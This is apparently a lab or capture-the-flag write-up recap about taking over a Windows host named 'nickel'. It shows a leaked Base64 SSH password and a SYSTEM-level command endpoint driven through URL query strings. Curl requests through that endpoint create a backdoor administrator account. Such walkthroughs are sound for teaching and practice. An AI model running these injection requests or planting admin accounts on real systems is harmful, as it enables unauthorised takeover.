#### Recap
The service on port 8089 exposed three application paths with hard-coded host addresses. It rejected GET requests, and the first POST returned HTTP 411 because it lacked a length. The resulting application exposure revealed an SSH credential.
```txt
cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah  -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```
The stored password was Base64-encoded. Decoding it revealed the plaintext credential, which provided an initial SSH session.

A local Infrastructure.pdf file was password-protected. Its password was recoverable, and the document contained the following lead.
```txt
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```
The temporary command endpoint executed in the SYSTEM context. Testing with an identity query confirmed the privilege boundary failure.
```powershell
net user root pass123 /add
# curl http://localhost/?net%20user%20root%20pass123%20%2Fadd

net localgroup administrators root /add
# curl http://localhost/?net%20localgroup%20administrators%20root%20%2Fadd
```
 The endpoint's SYSTEM execution allowed a local account to be granted administrator access. A new SSH session confirmed those privileges.
